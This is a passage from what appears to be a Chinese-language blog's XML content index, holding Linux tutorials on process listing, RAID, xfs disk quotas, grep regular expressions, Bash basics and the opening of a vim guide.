class="comment">#1] # ps -l</span></span><br><span class="line">F S   UID    PID   PPID  C PRI  NI ADDR SZ WCHAN  TTY          TIME CMD</span><br><span class="line">4 S     0   2965   2958  0  80   0 - 29274 do_wai pts/0    00:00:00 bash</span><br><span class="line">4 S     0  35485   2965  0  80   0 - 29191 do_wai pts/0    00:00:00 bash</span><br><span class="line">0 R     0  35532  35485  0  80   0 - 38312 -      pts/0    00:00:00 ps</span><br></pre></td></tr></table></figure></blockquote>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 进程 </tag>
            
            <tag> 程序 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>（十四）LVM</title>
      <link href="/Linux/14.LVM.html"/>
      <url>/Linux/14.LVM.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LVM </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>（十三）磁盘阵列</title>
      <link href="/Linux/13.%E7%A3%81%E7%9B%98%E9%98%B5%E5%88%97.html"/>
      <url>/Linux/13.%E7%A3%81%E7%9B%98%E9%98%B5%E5%88%97.html</url>
      
        <content type="html"><![CDATA[<p>磁盘阵列全名<code>Redundant Arrays of independent Disks</code>，通过技术将小磁盘组成大磁盘设备，有存储和数据保护的功能，磁盘阵列有几个级别（level），分别是RAID0,RAID1,RAID5,RAID6…</p><span id="more"></span><h2 id="RAID0"><a href="#RAID0" class="headerlink" title="RAID0"></a>RAID0</h2>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RAID </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>（十二）磁盘配额</title>
      <link href="/Linux/12.%E7%A3%81%E7%9B%98%E9%85%8D%E9%A2%9D.html"/>
      <url>/Linux/12.%E7%A3%81%E7%9B%98%E9%85%8D%E9%A2%9D.html</url>
      
        <content type="html"><![CDATA[<p>在多人多任务的环境中，会有多人使用同一个硬盘的情况，这时要将硬盘的容量进行均等分配，不然会影响其他用户的使用，这就是磁盘配额（quota）</p><span id="more"></span><h2 id="一般用途"><a href="#一般用途" class="headerlink" title="一般用途"></a>一般用途</h2><ul><li>服务器网站：每个人网页空间的限制</li><li>邮件服务器：每个人邮件空间的限制、</li><li>文件服务器：每个人能使用的硬盘空间</li><li>限制用户组的磁盘容量</li><li>限制用户的磁盘容量</li><li>限制目录的容量</li></ul><h2 id="使用前的限制"><a href="#使用前的限制" class="headerlink" title="使用前的限制"></a>使用前的限制</h2><ul><li><p>不同的文件系统对磁盘配额的支持    </p><p>ext不支持对目录的配额，xfs完美支持</p></li><li><p>查看内核是否支持磁盘配额</p><p>如果内核不支持，就不能进行磁盘配额的操作</p></li><li><p>配额只对一般用户有用</p><p>对root当然没用</p></li><li><p>若启动了SELinux，则有的目录不能参与磁盘配额</p></li></ul><h2 id="设置规范"><a href="#设置规范" class="headerlink" title="设置规范"></a>设置规范</h2><ul><li>可分别针对用户、用户组、目录进行配额限制</li><li>文件数量的限制（inode）、容量的限制（block）</li><li>限制分为硬限制（hard）、软限制（soft）<ul><li>软限制是一个警告，硬限制是能使用的最大容量</li></ul></li><li>宽限时间（grace time）<ul><li>超过soft的限定值会开始倒计时，后果就是锁定磁盘使用，当然超过hard的话直接锁定</li></ul></li></ul><h2 id="实际操作（xfs文件系统）"><a href="#实际操作（xfs文件系统）" class="headerlink" title="实际操作（xfs文件系统）"></a>实际操作（xfs文件系统）</h2><h3 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h3><p>1.创建3个账号，默认密码password</p><p>2.创建一个群组，把所有用户给到这个群组</p><p>3.每个用户限制500M的磁盘使用量，警告值450M，群组1G的限制，950的警告</p><p>4.尝试给一个目录限制磁盘使用（用户组与目录的限制不能共同开启）</p><p>5.宽限时间的限制</p><h3 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h3><p>创建三个账号</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!bash</span></span><br><span class="line"><span class="comment">#groupadd quotagrp</span></span><br><span class="line"><span class="keyword">for</span> username <span class="keyword">in</span> quota1 quota2 quota3</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">        useradd -g quotagrp <span class="variable">$username</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;password&quot;</span> | passwd --stdin <span class="variable">$username</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line">mkdir /home/quota</span><br><span class="line">chgrp quotagrp /home/quota</span><br><span class="line">chmod 2770 /home/quota</span><br></pre></td></tr></table></figure><p>然后限制所在的家目录/home/XXX，xfs的磁盘配额在挂载时申明，需要修改/etc/fstab，在配额的磁盘options加上usrquota,grpquota</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/dev/mapper/centos-home         /home               xfs          defaults,usrquota,grpquota        0    0</span><br></pre></td></tr></table></figure><p>重新挂载</p><p>此外options还可以设置</p><ul><li>uquota/usrquota/quota：用户账号</li><li>gquota/grpquota：群组</li><li>pquota/prjquota：单一目录，不能与群组共存</li></ul><h3 id="配额命令"><a href="#配额命令" class="headerlink" title="配额命令"></a><strong>配额命令</strong></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">xfs_quota -x -c <span class="string">&quot;command&quot;</span> [mountpoint]</span><br><span class="line">-x:专家模式，使用了才能加入-c命令参数</span><br><span class="line">-c:后面能加各种命令</span><br><span class="line"><span class="built_in">command</span>:</span><br><span class="line"><span class="built_in">print</span>:列出当前文件系统参数（可以看到是否支持quota）</span><br><span class="line">df:列出各磁盘分区数据，后面可接-b(block),-i(inode),-h(单位)等</span><br><span class="line">report:列出所欲配额选项的数据，可以加上-ugp(user/group/project)或-bi</span><br><span class="line">state:查看磁盘的配额状态</span><br><span class="line">xfs_quota -x -c <span class="string">&quot;limit [-ugp] b[soft|hard]=N i[soft|hard]=N name&quot;</span> dir</span><br><span class="line">xfs_quota -x -c <span class="string">&quot;timer [-ugp] [-bir] Ndays|Nhours|Nweeks|Nminutes&quot;</span> dir</span><br><span class="line"><span class="built_in">limit</span>:设置配额选项</span><br><span class="line">-gpu:group/project/user</span><br><span class="line">b[soft|hard]:设置block的限制，i就是inode</span><br><span class="line">name:就是用户/用户组</span><br><span class="line">dir:配额的是这个目录，也就是用户在这个目录下的容量被限制</span><br><span class="line">timer:设置宽限时间</span><br></pre></td></tr></table></figure><p>然后按照我们的目标设置如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">[root@study ~ 19:53 <span class="comment">#10] # xfs_quota -x -c &quot;limit -u bsoft=450M bhard=500M quota1&quot; /home</span></span><br><span class="line">[root@study ~ 19:54 <span class="comment">#11] # xfs_quota -x -c &quot;limit -u bsoft=450M bhard=500M quota2&quot; /home</span></span><br><span class="line">[root@study ~ 19:54 <span class="comment">#12] # xfs_quota -x -c &quot;limit -u bsoft=450M bhard=500M quota3&quot; /home</span></span><br><span class="line">[root@study ~ 19:54 <span class="comment">#13] # xfs_quota -x -c &quot;report -uh&quot; /home</span></span><br><span class="line">User quota on /home (/dev/mapper/centos-home)</span><br><span class="line">                        Blocks              </span><br><span class="line">User ID      Used   Soft   Hard Warn/Grace   </span><br><span class="line">---------- --------------------------------- </span><br><span class="line">root       466.5M      0      0  00 [0 days]</span><br><span class="line">manu     166.5M      0      0  00 [------]</span><br><span class="line">y2n          6.2M      0      0  00 [------]</span><br><span class="line">quota1     295.2M   450M   500M  00 [------]</span><br><span class="line">quota2        12K   450M   500M  00 [------]</span><br><span class="line">quota3        12K   450M   500M  00 [------]  </span><br><span class="line">[root@study ~ 19:55 <span class="comment">#14] # xfs_quota -x -c &quot;limit -g bsoft=950M bhard=1G quotagrp&quot; /home</span></span><br><span class="line">[root@study ~ 19:59 <span class="comment">#15] # xfs_quota -x -c &quot;report -gh&quot; /home</span></span><br><span class="line">Group quota on /home (/dev/mapper/centos-home)</span><br><span class="line">                        Blocks              </span><br><span class="line">Group ID     Used   Soft   Hard Warn/Grace   </span><br><span class="line">---------- --------------------------------- </span><br><span class="line">root       466.5M      0      0  00 [------]</span><br><span class="line">manu     166.5M      0      0  00 [------]</span><br><span class="line">y2n          6.2M      0      0  00 [------]</span><br><span class="line">quotagrp   295.2M   950M     1G  00 [------]</span><br></pre></td></tr></table></figure><p>如果限制的用户属于限制的用户组，用户组的容量优先</p><h3 id="限制目录容量（project）"><a href="#限制目录容量（project）" class="headerlink" title="限制目录容量（project）"></a>限制目录容量（project）</h3><p> 有一种情况就是在/home下还有一个目录属于某个群组，而这个群组成员使用的容量会影响到这个目录的容量，所以如果要针对目录来限制的话，就必须关闭群组的选项</p><h4 id="修改-etc-fstab"><a href="#修改-etc-fstab" class="headerlink" title="修改/etc/fstab"></a>修改/etc/fstab</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">dev/mapper/centos-home         /home               xfs          defaults,usrquota,prjquota        0    0</span><br><span class="line">[root@study ~ 12:53 <span class="comment">#2] # xfs_quota -x -c &quot;state&quot;</span></span><br><span class="line">User quota state on /home (/dev/mapper/centos-home)</span><br><span class="line">  Accounting: ON</span><br><span class="line">  Enforcement: ON</span><br><span class="line">  Inode: <span class="comment">#133932 (2 blocks, 2 extents)</span></span><br><span class="line">Group quota state on /home (/dev/mapper/centos-home)</span><br><span class="line">  Accounting: OFF</span><br><span class="line">  Enforcement: OFF</span><br><span class="line">  Inode: <span class="comment">#133933 (2 blocks, 2 extents)</span></span><br><span class="line">Project quota state on /home (/dev/mapper/centos-home)</span><br><span class="line">  Accounting: ON</span><br><span class="line">  Enforcement: ON</span><br><span class="line">  Inode: <span class="comment">#133933 (2 blocks, 2 extents)</span></span><br><span class="line">Blocks grace time: [7 days]</span><br><span class="line">Inodes grace time: [7 days]</span><br><span class="line">Realtime Blocks grace time: [7 days]</span><br></pre></td></tr></table></figure><h4 id="规范目录、选项名称及id"><a href="#规范目录、选项名称及id" class="headerlink" title="规范目录、选项名称及id"></a>规范目录、选项名称及id</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Enabling project quota on an XFS filesystem (restrict files <span class="keyword">in</span> <span class="built_in">log</span> file directories to only using 1 gigabyte of space).</span><br><span class="line"></span><br><span class="line">     <span class="comment"># mount -o prjquota /dev/xvm/var /var</span></span><br><span class="line">     <span class="comment"># echo 42:/var/log &gt;&gt; /etc/projects</span></span><br><span class="line">     <span class="comment"># echo logfiles:42 &gt;&gt; /etc/projid</span></span><br><span class="line">     <span class="comment"># xfs_quota -x -c &#x27;project -s logfiles&#x27; /var</span></span><br><span class="line">     <span class="comment"># xfs_quota -x -c &#x27;limit -p bhard=1g logfiles&#x27; /var</span></span><br></pre></td></tr></table></figure><p>以上是官方例子，写两个配置文件，<code>id:目录</code>写到<code>/etc/projects</code>，<code>自定义选项名:id</code>写到<code>/etc/projid</code>，使用<code>xfs_quota -x -c &#39;project -s 自定义名字&#39; /dir</code>初始化即可进行limit等设置，这里我就不过多演示了</p><h3 id="磁盘配额的管理命令"><a href="#磁盘配额的管理命令" class="headerlink" title="磁盘配额的管理命令"></a>磁盘配额的管理命令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">以下指令接在-c后面</span><br><span class="line">disable:暂停限制，后面接-gpu</span><br><span class="line">enable:恢复，与disable相对</span><br><span class="line">off:完全关闭，只有重新挂载才能恢复</span><br><span class="line">remove:删除限制，后面接-gpu</span><br></pre></td></tr></table></figure><h3 id="不修改文件系统的配额"><a href="#不修改文件系统的配额" class="headerlink" title="不修改文件系统的配额"></a>不修改文件系统的配额</h3><p>配额针对文件系统，而假如突然在其他的目录想使用配额，需要把它重新规划成一个单独的分区吗？可以巧妙的用链接搞定</p><ul><li>比如我想把/var/spool/mail目录限制容量<ul><li>将它移动到/home</li><li><code>ln -s /home/mail /var/spool/mail</code>建立目标链接</li><li>然后我们就可以只针对/home限制即可</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 管理磁盘 </tag>
            
            <tag> xfs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>（十）正则表达式</title>
      <link href="/Linux/10.%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F.html"/>
      <url>/Linux/10.%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F.html</url>
      
        <content type="html"><![CDATA[<p>正则表达式(<code>regular expression</code>)通过一定的规则进行查找、替换、删除字符，方便用户操作。作为一个系统管理员来说，正则表达式是一个非常好的查错方法，可以从非常长的日志文件中找到出问题的地方。正则表达式分为基础正则表达式和扩展正则表达式。想用正则表达式处理字符串，要使用支持正则表达式的程序，比如vim，sed，awk</p><span id="more"></span><h2 id="基础正则表达式"><a href="#基础正则表达式" class="headerlink" title="基础正则表达式"></a>基础正则表达式</h2><h3 id="1-语系对结果的影响"><a href="#1-语系对结果的影响" class="headerlink" title="1.语系对结果的影响"></a>1.语系对结果的影响</h3><p>正则表达式就是处理字符串的一种方式，字符排序（语系）将影响搜索结果</p><ul><li>LANG=C，字符排序是0,1,2…ABC…abc…</li><li>LANG=zh_CN，0123…aAbB…..</li></ul><p>当我们使用[A-Z]搜索字符时，LANG=C会得到A-Z，LANG=zh-CN会得到Aa-Z的结果，所以语系不同，结果也不同</p><p>而为了避免这样编码造成的问题，有一些特殊符号可以解决</p><table><thead><tr><th>符号</th><th>代表意义</th></tr></thead><tbody><tr><td>[:alnum:]</td><td>所有字母大小写和数字</td></tr><tr><td>[:alpha:]</td><td>任何字母大小写字符</td></tr><tr><td>[:blank:]</td><td>代表<code>space</code>和<code>Tab</code>按键</td></tr><tr><td>[:cntrl:]</td><td>代表控制按键，如CR,LF,Tab,Del等</td></tr><tr><td>[:digit:]</td><td>0-9</td></tr><tr><td>[:graph:]</td><td>除空格键以外的其他按键</td></tr><tr><td>[:lower:]</td><td>a-z</td></tr><tr><td>[:print:]</td><td>任意可以被打印出来的字符</td></tr><tr><td>[:punct:]</td><td>标点符号（punctuation symbol）</td></tr><tr><td>[:upper:]</td><td>A-Z</td></tr><tr><td>[:space:]</td><td>任意会产生空白的字符</td></tr><tr><td>[:xdigit:]</td><td>十六进制的数字类型0-9a-fA-F</td></tr></tbody></table><p>下面进行实际操作</p><h3 id="2-grep"><a href="#2-grep" class="headerlink" title="2.grep"></a>2.grep</h3><p>grep支持正则表达式，先拿他演示一下</p><p><strong>grep是以行为单位进行查找，删除的</strong></p><p><strong>语法</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">grep [-acinv] [--color=auto] <span class="string">&#x27;查找字符&#x27;</span> filename</span><br><span class="line">-a:将二进制文件以文本的形式查找数据</span><br><span class="line">-c:计算‘查找字符’的数量</span><br><span class="line">-i:忽略大小写</span><br><span class="line">-n:输出行号</span><br><span class="line">-v:反选</span><br><span class="line">--color=auto:显示颜色</span><br><span class="line">-A:后可接数字n，表示将本行加后n行显示出来</span><br><span class="line">-B:后可接数字n，显示本行及前面n行</span><br></pre></td></tr></table></figure><p>使用前请将语系设置为C</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> LANG=C;<span class="built_in">export</span> LC_ALL=C</span><br></pre></td></tr></table></figure><h4 id="查找规定字符串"><a href="#查找规定字符串" class="headerlink" title="查找规定字符串"></a>查找规定字符串</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep <span class="string">&#x27;string&#x27;</span> filename</span><br></pre></td></tr></table></figure><p>查找tast和test时，发现它们都是t?st的形式，可以这样查找</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep <span class="string">&#x27;t[ae]st&#x27;</span> filename</span><br></pre></td></tr></table></figure><ul><li><code>[]</code>里面不管有多少字符，都仅代表一个字符（或）</li><li><code>[^]</code>代表反选，<code>[^a]</code>代表不含a，<code>[^a-z]</code>&amp;<code>[^abcd..z]</code>都代表不含小写字母的意思</li><li>连续的字符可以这样表示：<code>[0-9]</code>，<code>[a-z]</code>，<code>[A-Z]</code>或者<code>[0-9a-zA-Z]</code></li><li><code>[[:lower:]]</code>即含有小写字母的意思</li></ul><h4 id="行首与行尾字符"><a href="#行首与行尾字符" class="headerlink" title="行首与行尾字符^,$"></a>行首与行尾字符^,$</h4><p>想查找以the开头的时使用</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep <span class="string">&#x27;^the&#x27;</span> filename</span><br></pre></td></tr></table></figure><p>查找以小写字母开头时</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">grep <span class="string">&#x27;^[a-z]&#x27;</span> filename</span><br><span class="line">grep <span class="string">&#x27;[[:lower:]]&#x27;</span> filename</span><br></pre></td></tr></table></figure><p>查找非小写字母开头</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep <span class="string">&#x27;^[^a-z]&#x27;</span> filename</span><br></pre></td></tr></table></figure><p>注意行尾的符号要看系统，wondows的换行符是^M$，Linux是^$</p><p>查找空白行（其实一般是将它反选）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep <span class="string">&#x27;^$&#x27;</span> filename</span><br></pre></td></tr></table></figure><p>删除注释（行首为#，如果直接是#的话会误删）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep <span class="string">&#x27;^#&#x27;</span> -v filename</span><br></pre></td></tr></table></figure><h4 id="任一字符-和重复字符"><a href="#任一字符-和重复字符" class="headerlink" title="任一字符.和重复字符*"></a>任一字符<code>.</code>和重复字符<code>*</code></h4><ul><li><code>.</code>表示一定有一个任意字符</li><li><code>*</code>表示重复前一个字符，<strong>0到无穷次</strong></li></ul><p>查找g??d</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep <span class="string">&#x27;g..d&#x27;</span> filename</span><br></pre></td></tr></table></figure><p>查找god，good..即g与g中间含一个o到无数个o</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep <span class="string">&#x27;goo*d&#x27;</span> filename</span><br></pre></td></tr></table></figure><p>查找开头是g结尾是g（g…g）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep <span class="string">&#x27;g.*g&#x27;</span> filename</span><br></pre></td></tr></table></figure><h4 id="限定RE字符范围"><a href="#限定RE字符范围" class="headerlink" title="限定RE字符范围{}"></a>限定RE字符范围{}</h4><p><code>*</code>是0-无穷个，如果想限定范围呢，就要使用<code>&#123;&#125;</code>，由于<code>&#123;&#125;</code>在shell下有其他意义（通配和替换），所以要使用<code>\</code>转义</p><p>查找2个o</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep <span class="string">&#x27;o\&#123;2\&#125;&#x27;</span> filename</span><br></pre></td></tr></table></figure><p>查找2-5个o</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep <span class="string">&#x27; \&#123;2,5\&#125;&#x27;</span> filename</span><br></pre></td></tr></table></figure><p>查找2个以上的o</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep <span class="string">&#x27;o\&#123;2,\&#125;&#x27;</span> filename</span><br></pre></td></tr></table></figure><h2 id="基础正则表达式字符集合"><a href="#基础正则表达式字符集合" class="headerlink" title="基础正则表达式字符集合"></a>基础正则表达式字符集合</h2><table><thead><tr><th>RE字符</th><th>意义</th></tr></thead><tbody><tr><td>^word</td><td>行首是word</td></tr><tr><td>word$</td><td>行末是word</td></tr><tr><td><code>.</code></td><td>任一字符</td></tr><tr><td><code>\</code></td><td>转义字符</td></tr><tr><td>*</td><td>重复<strong>前一个字符</strong>从0到无穷多个</td></tr><tr><td>[list]</td><td>代表一个集合，取出一个字符</td></tr><tr><td>[n1-n2]</td><td>代表两字符中间的所有字符</td></tr><tr><td>[^list]</td><td>反选</td></tr><tr><td>\{n1,n2\}</td><td>n1n2是数字，n1到n2个前一个字符</td></tr></tbody></table><h2 id="扩展正则表达式"><a href="#扩展正则表达式" class="headerlink" title="扩展正则表达式"></a>扩展正则表达式</h2><p>扩展正则表达式也需要支持的程序才能执行，比如egrep（grep -E）</p><table><thead><tr><th>re字符</th><th>意义</th></tr></thead><tbody><tr><td>+</td><td>重复前一个字符1次或无穷次</td></tr><tr><td>?</td><td>重复前一个字符0-1个次</td></tr><tr><td>|</td><td>or</td></tr><tr><td><code>()</code></td><td>里面是一个群组，可以与|结合使用</td></tr><tr><td><code>()+</code></td><td>重复的群组</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> shell </tag>
            
            <tag> bash </tag>
            
            <tag> 正则表达式 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>（九）Bash shell</title>
      <link href="/Linux/9.bash-shell.html"/>
      <url>/Linux/9.bash-shell.html</url>
      
        <content type="html"><![CDATA[<p>说Bash之前，先说一下shell，在运行C程序时，windows有一个黑色的窗口，那就是shell，简单来说就是用户可以通过shell操作内核，内核可以调控硬件，而bash就是一个shell。</p><span id="more"></span><p>至于现在有这么多图形环境为什么还要学shell，咳咳，技多不压身，主要是因为图形的工具是集成的，并不是一个完整的一个程序，有一些功能只有shell才能完成，更多原因是Linux发行版都有bash shell。</p><p>Linux里面不只bash shell，更多的shell请查看/etc/shells，这是个文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[manu@study ~]$ cat /etc/shells</span><br><span class="line">/bin/sh</span><br><span class="line">/bin/bash</span><br><span class="line">/usr/bin/sh</span><br><span class="line">/usr/bin/bash</span><br><span class="line">/bin/tcsh</span><br><span class="line">/bin/csh</span><br></pre></td></tr></table></figure><p>用户登陆时，系统会给一个默认的shell，具体是哪个shell，查看/etc/passwd文件</p><h2 id="bash-shell的功能"><a href="#bash-shell的功能" class="headerlink" title="bash shell的功能"></a>bash shell的功能</h2><h3 id="1-记录历史命令"><a href="#1-记录历史命令" class="headerlink" title="1.记录历史命令"></a>1.记录历史命令</h3><p>使用命令时，可以发现使用上下键可以得到以前输入的命令，而这个命令的记录就在~/.bash_history文件里，当然记录命令有好有坏，它可以查询以前的指令，但当被黑客入侵时，翻找命令就会找到以前的重要信息</p><h3 id="2-命令文件补全功能"><a href="#2-命令文件补全功能" class="headerlink" title="2.命令文件补全功能"></a>2.命令文件补全功能</h3><p>可以补全命令、参数、文件等，可以少打很多字，确保正确</p><p>使用首字母和两下tab就可以得到关于字母的所有指令</p><h3 id="3-命令别名"><a href="#3-命令别名" class="headerlink" title="3.命令别名"></a>3.命令别名</h3><p>当某命令很长，而我们又常用时，就可以给他取一个“小名”，比如</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">alias</span> ll=<span class="string">&#x27;ls -l&#x27;</span></span><br></pre></td></tr></table></figure><p>这样<code>ll</code>就代表<code>ls -l</code></p><h3 id="4-任务管理、前台、后台控制-job-control-foreground-background"><a href="#4-任务管理、前台、后台控制-job-control-foreground-background" class="headerlink" title="4.任务管理、前台、后台控制(job control foreground background)"></a>4.任务管理、前台、后台控制(job control foreground background)</h3><h3 id="5-程序化脚本-shell-scripts"><a href="#5-程序化脚本-shell-scripts" class="headerlink" title="5.程序化脚本(shell scripts)"></a>5.程序化脚本(shell scripts)</h3><p>类似windows上的批处理功能</p><h3 id="6-通配符-wildcard"><a href="#6-通配符-wildcard" class="headerlink" title="6.通配符(wildcard)"></a>6.通配符(wildcard)</h3><p>就像*可以代表任意字符一样</p><h2 id="bash简单操作"><a href="#bash简单操作" class="headerlink" title="bash简单操作"></a>bash简单操作</h2><h3 id="查看指令是否为bash的内置指令"><a href="#查看指令是否为bash的内置指令" class="headerlink" title="查看指令是否为bash的内置指令"></a>查看指令是否为bash的内置指令</h3><p>当man cd时，实际跳转的事bash的页面，所以cd就是bash的内置指令，可以使用type来观察某指令是bash的还是其他的指令</p><p><strong>语法</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">type</span> [-] <span class="built_in">command</span></span><br><span class="line">-t:会以file（外部），<span class="built_in">alias</span>（别名），<span class="built_in">builtin</span>（bash内置）显示</span><br><span class="line">-p:如果时外部指令，显示路径</span><br><span class="line">-a:显示在[PATH]的所有<span class="built_in">command</span>命令</span><br></pre></td></tr></table></figure><h3 id="命令的执行与编辑"><a href="#命令的执行与编辑" class="headerlink" title="命令的执行与编辑"></a>命令的执行与编辑</h3><p>前面说过<code>\</code>可以将太长的指令转到下一行来输入，这个<code>\</code>就是转义字符，顾名思义就是将它原本的意思转变成别的意思，在这里就是将<code>enter</code>键原本的意思（执行）转变成下一行输入的意思，要特别注意一点，<code>/</code>必须和<code>enter</code>紧贴着，因为<code>\</code>只转紧跟着的下一个字符</p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
          <category> shell </category>
          
      </categories>
      
      
        <tags>
            
            <tag> bash </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>(八)vim editer</title>
      <link href="/Linux/8.vim-editer.html"/>
      <url>/Linux/8.vim-editer.html</url>
      
        <content type="html"><![CDATA[<img src="https://cdn.jsdelivr.net/gh/yangchaohe/yangchaohe.github.io@static/img/article/2020/vim-commands.jpg"  /><p>简单来说就是一个文本编辑器，如同前面的nano，但vi有更多功能，vim则是vi的的升级版</p><p>学习vim的主要条件是因为</p><ol><li>所有UNIX-like都有vi，而其他的文本编辑器未必有</li><li>很多软件的编辑接口都有vi</li><li>vim具有程序编程的能力，比如语法高亮</li><li>编辑迅速</li></ol><span id="more"></span><h2 id="使用vi"><a href="#使用vi" class="headerlink" title="使用vi"></a>使用vi</h2><h3 id="三种模式"><a href="#三种模式" class="headerlink" title="三种模式"></a>三种模式</h3><ul><li><p><strong>command mode</strong></p><ul><li>命令<code>vi filename</code>就会进入<code>command mode</code>(一般命令模式)，不管文件名存不存在（存在就打开，不存在就新建）</li><li>可以进行复制粘贴、删除、搜索、替换等操作</li></ul></li><li><p><strong>insert mode</strong></p><ul><li>在一般模式下使用<code>i、I、o、O</code>等就可以进入<code>insert mode</code>(编辑模式)</li><li>可以编辑字符</li><li><code>esc</code>退出编辑模式</li></ul></li><li><p><strong>command-line 